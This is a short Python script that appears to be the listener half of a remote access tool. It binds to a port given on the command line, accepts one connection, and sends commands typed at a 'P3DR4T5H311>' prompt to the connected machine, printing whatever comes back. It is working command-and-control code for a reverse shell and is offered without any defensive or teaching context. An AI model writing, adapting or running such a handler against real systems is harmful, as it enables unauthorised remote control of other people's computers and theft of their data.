import socket,subprocess,sys

host =''
port = int(sys.argv[1])

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#sock.setblocking(0)
sock.bind((host,port))
sock.listen(1)
conn, addr = sock.accept()
while 1:
    command = input("P3DR4T5H311> ")
    command = command.encode()
    command = conn.send(command)
    result= conn.recv(4096)
    result= result.decode()
    print(result)
